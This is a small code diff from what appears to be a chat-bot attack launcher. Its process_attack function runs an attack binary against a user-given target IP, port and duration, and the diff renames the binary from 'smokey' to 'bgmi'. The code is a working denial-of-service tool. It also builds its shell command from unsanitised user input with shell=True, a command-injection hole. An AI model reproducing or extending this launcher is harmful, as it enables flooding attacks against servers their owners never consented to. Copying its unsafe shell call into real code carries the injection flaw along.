@@ -84,7 +84,7 @@ def process_attack(message, target, port, time):
     start_attack_reply(message, target, port, time)
     
     # Execute the attack
-    full_command = f"./smokey {target} {port} {time} 1200"
+    full_command = f"./bgmi {target} {port} {time} 1200"
     try:
         subprocess.run(full_command, shell=True, check=True)
     except subprocess.CalledProcessError:
